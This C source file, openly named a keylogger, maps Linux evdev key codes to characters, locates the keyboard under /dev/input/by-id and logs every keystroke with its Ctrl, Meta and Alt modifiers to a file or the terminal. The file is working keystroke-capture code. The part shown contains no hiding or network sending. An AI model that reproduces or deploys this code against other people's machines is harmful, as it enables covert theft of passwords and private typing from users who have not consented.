#include "keylogger.h"

#include <dirent.h>
#include <linux/input-event-codes.h>
#include <stdio.h>
#include <string.h>

#define KEY_MAP_SIZE 128

const KeyMap key_map[KEY_MAP_SIZE] = {
    [KEY_A] = {"a", "A"},
    [KEY_B] = {"b", "B"},
    [KEY_C] = {"c", "C"},
    [KEY_D] = {"d", "D"},
    [KEY_E] = {"e", "E"},
    [KEY_F] = {"f", "F"},
    [KEY_G] = {"g", "G"},
    [KEY_H] = {"h", "H"},
    [KEY_I] = {"i", "I"},
    [KEY_J] = {"j", "J"},
    [KEY_K] = {"k", "K"},
    [KEY_L] = {"l", "L"},
    [KEY_M] = {"m", "M"},
    [KEY_N] = {"n", "N"},
    [KEY_O] = {"o", "O"},
    [KEY_P] = {"p", "P"},
    [KEY_Q] = {"q", "Q"},
    [KEY_R] = {"r", "R"},
    [KEY_S] = {"s", "S"},
    [KEY_T] = {"t", "T"},
    [KEY_U] = {"u", "U"},
    [KEY_V] = {"v", "V"},
    [KEY_W] = {"w", "W"},
    [KEY_X] = {"x", "X"},
    [KEY_Y] = {"y", "Y"},
    [KEY_Z] = {"z", "Z"},
    [KEY_0] = {"0", ")"},
    [KEY_1] = {"1", "!"},
    [KEY_2] = {"2", "@"},
    [KEY_3] = {"3", "#"},
    [KEY_4] = {"4", "$"},
    [KEY_5] = {"5", "%"},
    [KEY_6] = {"6", "^"},
    [KEY_7] = {"7", "&"},
    [KEY_8] = {"8", "*"},
    [KEY_9] = {"9", "("},
    [KEY_SPACE] = {"Space", "Space"},
    [KEY_ENTER] = {"Enter", "Enter"},
    [KEY_BACKSPACE] = {"Backspace", "Backspace"},
    [KEY_TAB] = {"Tab", "Tab"},
    [KEY_ESC] = {"Esc", "Esc"},
    [KEY_COMMA] = {",", "<"},
    [KEY_DOT] = {".", ">"},
    [KEY_SLASH] = {"/", "?"},
    [KEY_SEMICOLON] = {";", ":"},
    [KEY_APOSTROPHE] = {"'", "\""},
    [KEY_LEFTBRACE] = {"[", "{"},
    [KEY_RIGHTBRACE] = {"]", "}"},
    [KEY_MINUS] = {"-", "_"},
    [KEY_EQUAL] = {"=", "+"},
    [KEY_GRAVE] = {"`", "~"},
    [KEY_BACKSLASH] = {"\\", "|"},
    [KEY_KPASTERISK] = {"*", "*"},
    [KEY_KPPLUS] = {"+", "+"},
    [KEY_KPMINUS] = {"-", "-"},
    [KEY_KPDOT] = {".", "."},
    [KEY_KP0] = {"KP_0", "KP_0"},
    [KEY_KP1] = {"KP_1", "KP_1"},
    [KEY_KP2] = {"KP_2", "KP_2"},
    [KEY_KP3] = {"KP_3", "KP_3"},
    [KEY_KP4] = {"KP_4", "KP_4"},
    [KEY_KP5] = {"KP_5", "KP_5"},
    [KEY_KP6] = {"KP_6", "KP_6"},
    [KEY_KP7] = {"KP_7", "KP_7"},
    [KEY_KP8] = {"KP_8", "KP_8"},
    [KEY_KP9] = {"KP_9", "KP_9"},
    [KEY_UP] = {"Arrow Up", "Arrow Up"},
    [KEY_DOWN] = {"Arrow Down", "Arrow Down"},
    [KEY_LEFT] = {"Arrow Left", "Arrow Left"},
    [KEY_RIGHT] = {"Arrow Right", "Arrow Right"},
    [KEY_CAPSLOCK] = {"CapsLock", "CapsLock"},
    [KEY_HOME] = {"Home", "Home"},
    [KEY_DELETE] = {"Del", "Del"},
};

const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active) {
    if (key_code >= 0 && (size_t)key_code < sizeof(key_map) / sizeof(key_map[0]) && key_map[key_code].normal != NULL) {
        if (key_code >= KEY_A && key_code <= KEY_Z) {
            if (capslock_active != shift_pressed) {
                return key_map[key_code].shifted;
            }
            return key_map[key_code].normal;
        }
        return shift_pressed ? key_map[key_code].shifted : key_map[key_code].normal;
    }
    return "UNKNOWN";
}

char *find_keyboard_device(const char *target_device_name) {
    DIR *dir;
    struct dirent *ent;
    static char keyboard_path[BUFFER_SIZE];
    const char base_path[] = "/dev/input/by-id/";
    size_t base_path_len = strlen(base_path);

    if ((dir = opendir(base_path)) == NULL) {
        perror("Cannot access /dev/input/by-id");
        return NULL;
    }

    while ((ent = readdir(dir)) != NULL) {
        size_t ent_name_len = strlen(ent->d_name);
        if (base_path_len + ent_name_len < sizeof(keyboard_path)) {
            snprintf(keyboard_path, sizeof(keyboard_path), "%s%s", base_path, ent->d_name);
            if (target_device_name) {
                if (strcmp(ent->d_name, target_device_name) == 0) {
                    closedir(dir);
                    return keyboard_path;
                }
            } else {
                if (strstr(ent->d_name, "kbd") || strstr(ent->d_name, "keyboard")) {
                    closedir(dir);
                    return keyboard_path;
                }
            }
        } else {
            fprintf(stderr, "Device name too long: %s\n", ent->d_name);
        }
    }

    closedir(dir);
    return NULL;
}

void log_key(FILE *fp, bool ctrl_pressed, bool meta_pressed, bool alt_pressed, bool log_to_file, const char *key_name) {
    bool is_modifier = (strcmp(key_name, "Shift") == 0 || strcmp(key_name, "Ctrl") == 0 ||
                        strcmp(key_name, "Meta") == 0 || strcmp(key_name, "Alt") == 0);

    if (log_to_file) {
        if (is_modifier) {
            fprintf(fp, "%s\n", key_name);
        } else {
            if (ctrl_pressed) fprintf(fp, "Ctrl+");
            if (meta_pressed) fprintf(fp, "Meta+");
            if (alt_pressed) fprintf(fp, "Alt+");
            fprintf(fp, "%s\n", key_name);
        }
        fflush(fp);
    } else {
        if (is_modifier) {
            printf("%s\n", key_name);
        } else {
            if (ctrl_pressed) printf("Ctrl+");
            if (meta_pressed) printf("Meta+");
            if (alt_pressed) printf("Alt+");
            printf("%s\n", key_name);
        }
    }
}
